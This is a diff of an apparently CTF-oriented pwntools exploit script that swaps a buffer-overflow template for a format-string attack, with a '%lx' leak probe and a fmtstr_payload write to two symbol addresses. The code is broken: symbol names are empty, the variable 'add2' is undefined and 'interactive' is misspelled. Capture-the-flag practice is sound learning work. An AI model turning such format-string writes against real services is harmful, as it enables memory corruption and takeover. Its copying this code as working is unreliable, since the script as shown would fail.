@@ -7,44 +7,42 @@ from pwn import *
 exe = './chall'
 elf = context.binary = ELF(exe, checksec=True)
 context.log_level = 'debug'
-host = 'chall.server'
+host = ''
 port = 1337
 
 def start(argv=[]):
     if args.GDB:
         return gdb.debug([exe] + argv, gdbscript=gdbscript)
-    elif args.REMOTE:
+    elif args.REMOTE: 
         return remote(host, port)
     else:
         return process([exe] + argv)
 
 gdbscript = '''
 init-pwndbg
-continue
 '''.format(**locals())
 
+# =========================================================
+#                         FUZZING
+# =========================================================
 io = start()
+io.sendlineafter(b'> ', b'AAAAAAAA.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx')
+io.close()
 
 # =========================================================
 #                         ADDRESSES
 # =========================================================
-win = 0x1337
+addr1 = elf.sym[''] # 
+addr2 = elf.sym[''] # 
+value = 0x86a693c
+padding = b'\x01'
 
 # =========================================================
 #                         EXPLOITS
 # =========================================================
+io = start()
 
-# Got manually through cyclic gdb-pwndbg
-offset = 1337
+payload_auto = fmtstr_payload(6, {addr1 : add2, addr2 : value})
 
-# flattening  payload here
-payload = flat({
-    offset: [
-        win
-    ]
-})
-
-# sending payload
-io.sendlineafter(b'>', payload)
-
-io.interactive()
+io.sendlineafter(b'> ', payload_auto)
+io.interacitve()
